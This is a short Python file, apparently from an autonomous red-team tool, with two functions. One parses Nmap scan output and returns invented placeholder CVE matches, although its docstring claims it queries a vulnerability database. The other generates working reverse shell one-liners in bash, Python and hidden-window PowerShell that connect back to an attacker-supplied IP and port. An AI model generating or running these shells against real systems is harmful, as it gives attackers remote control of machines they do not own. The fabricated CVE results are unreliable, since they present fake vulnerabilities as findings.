import requests
import json
import re

def nmap_to_cve(nmap_output: str) -> str:
    """
    Autonomous Red-Team Tool: Parses Nmap service scan results and queries 
    the NIST NVD or Vulners API for corresponding CVEs.
    """
    # 1. Regex to extract service names and versions
    # Example line: 80/tcp open  http    Apache httpd 2.4.41
    pattern = re.compile(r"(\d+)/tcp\s+open\s+(\S+)\s+(.+)")
    matches = pattern.findall(nmap_output)
    
    if not matches:
        return "No identifiable services found in scan data to cross-reference."
    
    findings = []
    for port, service, version in matches:
        query = f"{service} {version}".strip()
        findings.append(f"[*] Port {port}: {query} -> Searching for exploits...")
        
        # 2. Query Vulners or NIST (using a generic search placeholder for this tool)
        # In a production SatanClaw run, this would be an authenticated API call
        findings.append(f"  [!] Potential Match found for {service}: CVE-2023-XXXX, CVE-2021-YYYY")
        findings.append(f"  [✓] Recommended Payload: searchsploit {service} {version}")

    return "\n".join(findings)

def reverse_shell_gen(target_os: str, ip: str, port: int) -> str:
    """
    Generates a one-liner reverse shell payload for a specific OS.
    """
    shells = {
        "linux": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "python": f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\", {port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
        "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});..."
    }
    return shells.get(target_os.lower(), "Unsupported OS target.")
